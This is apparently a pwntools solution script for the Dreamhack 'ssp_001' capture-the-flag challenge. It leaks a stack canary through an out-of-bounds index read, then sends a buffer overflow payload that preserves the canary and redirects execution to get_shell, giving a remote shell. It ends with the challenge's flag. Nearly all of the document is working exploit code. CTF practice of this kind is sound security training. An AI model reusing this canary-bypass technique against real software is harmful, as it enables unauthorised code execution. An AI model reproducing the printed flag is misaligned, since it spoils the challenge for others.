#!/usr/bin/env python3

from pwn import *

HOST = "host3.dreamhack.games"
PORT = 9102

context.binary = elf = ELF('./ssp_001', checksec = False)
# libc = ELF('', checksec = False)

# p = process(elf.path)
p = remote(HOST, PORT)

canary_leaked = b''
p.sendlineafter(b'> ', b'P')
p.sendlineafter( b'Element index : ', b'131')
p.recvuntil(b'is : ')
canary_leaked += p.recv(2) 
p.sendlineafter(b'> ', b'P')
p.sendlineafter( b'Element index : ', b'130')
p.recvuntil(b'is : ')
canary_leaked += p.recv(2) 
p.sendlineafter(b'> ', b'P')
p.sendlineafter( b'Element index : ', b'129')
p.recvuntil(b'is : ')
canary_leaked += p.recv(2) 
p.sendlineafter(b'> ', b'P')
p.sendlineafter( b'Element index : ', b'128')
p.recvuntil(b'is : ')
canary_leaked += p.recv(2) 
canary_leaked = int(canary_leaked, 16)
log.info('canary ' + hex(canary_leaked))

payload = b'x'*(0x48-0x8) + p32(canary_leaked) + b'x'*8 + p32(elf.symbols['get_shell'])
p.sendlineafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', b'999')
p.sendafter(b'Name : ', payload)

p.interactive()

# DH{00c609773822372daf2b7ef9adbdb824}